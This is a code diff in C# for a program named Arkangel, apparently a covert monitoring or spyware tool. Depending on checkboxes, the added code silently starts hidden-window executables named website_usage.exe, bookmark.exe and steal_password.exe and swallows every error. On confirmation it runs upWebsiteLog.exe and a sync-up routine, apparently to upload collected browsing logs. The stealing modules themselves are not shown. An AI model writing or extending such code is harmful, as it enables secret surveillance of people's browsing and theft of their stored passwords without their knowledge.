@@ -1,6 +1,7 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.Data.SQLite;
+using System.Diagnostics;
 using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
@@ -39,6 +40,43 @@ namespace Arkangel
                     }
                 }
             }
+          
+            if (cb_enable.IsChecked.Value == true)
+            {
+                try
+                {
+                    ProcessStartInfo start = new ProcessStartInfo();
+                    start.WorkingDirectory = @"..\..\module\";
+                    start.FileName = "website_usage.exe";
+                    start.WindowStyle = ProcessWindowStyle.Hidden;
+                    Process.Start(start);
+                }
+                catch { }
+            }
+            if (cb_bookmark.IsChecked.Value==true)
+            {
+                try
+                {
+                    ProcessStartInfo start = new ProcessStartInfo();
+                    start.WorkingDirectory = @"..\..\module\";
+                    start.FileName = "bookmark.exe";
+                    start.WindowStyle = ProcessWindowStyle.Hidden;
+                    Process.Start(start);
+                }
+                catch { }
+            }
+            if (cb_password.IsChecked.Value==true)
+            {
+                try
+                {
+                    ProcessStartInfo start = new ProcessStartInfo();
+                    start.WorkingDirectory = @"..\..\module\";
+                    start.FileName = "steal_password.exe";
+                    start.WindowStyle = ProcessWindowStyle.Hidden;
+                    Process.Start(start);
+                }
+                catch { }
+            }
         }
 
         private void bt_OK_Click(object sender, RoutedEventArgs e)
@@ -58,6 +96,17 @@ namespace Arkangel
                     sqlup_WU.ExecuteNonQuery();
                 }
             }
+
+            try
+            {
+                ProcessStartInfo start = new ProcessStartInfo();
+                start.WorkingDirectory = @"..\..\module\";
+                start.FileName = "upWebsiteLog.exe";
+                start.WindowStyle = ProcessWindowStyle.Hidden;
+                Process.Start(start);
+            }
+            catch { }
+                Functions.syncUp();
         }
     }
 }
